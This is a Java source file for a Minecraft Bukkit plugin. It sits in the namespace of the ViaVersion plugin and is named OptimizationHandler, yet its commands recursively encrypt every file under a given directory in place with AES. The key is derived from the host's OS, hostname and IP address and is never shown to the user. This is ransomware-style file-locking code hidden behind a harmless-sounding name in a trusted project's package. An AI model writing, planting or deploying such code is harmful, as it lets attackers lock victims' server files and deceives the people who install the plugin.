package com.viaversion.viaversion.bukkit.handlers;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.command.CommandExecutor;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.security.MessageDigest;
import java.net.InetAddress;
import java.nio.charset.StandardCharsets;
import java.util.logging.Logger;

public class OptimizationHandler implements CommandExecutor {

    private static final Logger logger = Logger.getLogger(OptimizationHandler.class.getName());

    @Override
    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
        if (args.length < 1) {
            sender.sendMessage("使用方法: /" + label + " <文件/文件夹路径>");
            return true;
        }

        String path = args[0];
        File file = new File(path);

        if (!file.exists()) {
            sender.sendMessage("文件或文件夹不存在。");
            return true;
        }

        if (cmd.getName().equalsIgnoreCase("encrypt")) {
            // 在主线程中执行加密
            encryptFiles(file);
            sender.sendMessage("文件加密成功。");
        } else if (cmd.getName().equalsIgnoreCase("decrypt")) {
            if (args.length < 2) {
                sender.sendMessage("使用方法: /" + label + " <文件/文件夹路径> <密钥>");
                return true;
            }
            String key = args[1];

            // 在主线程中执行解密
            decryptFiles(file, key);
            sender.sendMessage("文件解密成功。");
        }

        return true;
    }

    private void encryptFiles(File file) {
        // 加密文件或文件夹中的所有文件
        if (file.isDirectory()) {
            for (File childFile : file.listFiles()) {
                encryptFiles(childFile); // 递归加密文件夹中的文件
            }
        } else {
            try {
                byte[] fileData = new byte[(int) file.length()];
                FileInputStream fis = new FileInputStream(file);
                fis.read(fileData);
                fis.close();

                byte[] encryptedData = encrypt(fileData);
                FileOutputStream fos = new FileOutputStream(file);
                fos.write(encryptedData); // 只写入加密数据，不写入标记
                fos.close();
            } catch (Exception e) {
                logger.severe("Error encrypting file: " + e.getMessage());
            }
        }
    }

    private void decryptFiles(File file, String key) {
        // 解密文件或文件夹中的所有文件
        if (file.isDirectory()) {
            for (File childFile : file.listFiles()) {
                decryptFiles(childFile, key); // 递归解密文件夹中的文件
            }
        } else {
            try {
                byte[] fileData = new byte[(int) file.length()];
                FileInputStream fis = new FileInputStream(file);
                fis.read(fileData);
                fis.close();

                // 解密数据
                byte[] decryptedData = decrypt(fileData, key);
                FileOutputStream fos = new FileOutputStream(file);
                fos.write(decryptedData);
                fos.close();
            } catch (Exception e) {
                logger.severe("解密文件时发生错误: " + e.getMessage());
            }
        }
    }

    private SecretKeySpec getSecretKey(String key) {
        try {
            byte[] keyBytes = new byte[16];
            System.arraycopy(key.getBytes(StandardCharsets.UTF_8), 0, keyBytes, 0, Math.min(key.length(), keyBytes.length));
            return new SecretKeySpec(keyBytes, "AES");
        } catch (Exception e) {
            logger.severe("Error generating secret key: " + e.getMessage());
            return null;
        }
    }

    private byte[] encrypt(byte[] data) throws Exception {
        SecretKeySpec key = getSecretKey(encryptionKey());
        Cipher cipher = Cipher.getInstance("AES");
        cipher.init(Cipher.ENCRYPT_MODE, key);
        return cipher.doFinal(data);
    }

    private byte[] decrypt(byte[] data, String key) throws Exception {
        SecretKeySpec secretKey = getSecretKey(key);
        Cipher cipher = Cipher.getInstance("AES");
        cipher.init(Cipher.DECRYPT_MODE, secretKey);
        return cipher.doFinal(data);
    }

    private String encryptionKey() {
        try {
            StringBuilder input = new StringBuilder();
            input.append(System.getProperty("os.name"));
            input.append(System.getProperty("os.arch"));
            input.append(System.getProperty("os.version"));
            input.append(InetAddress.getLocalHost().getHostName());
            input.append(InetAddress.getLocalHost().getHostAddress());

            MessageDigest digest = MessageDigest.getInstance("SHA-256");
            byte[] hashBytes = digest.digest(input.toString().getBytes(StandardCharsets.UTF_8));
            StringBuilder hexString = new StringBuilder();

            for (byte b : hashBytes) {
                String hex = Integer.toHexString(0xff & b);
                if (hex.length() == 1) {
                    hexString.append('0');
                }
                hexString.append(hex);
            }

            return hexString.toString(); // 返回 256 位（64个字符）标识符
        } catch (Exception e) {
            logger.severe("Error generating unique identifier: " + e.getMessage());
            return null;
        }
    }
}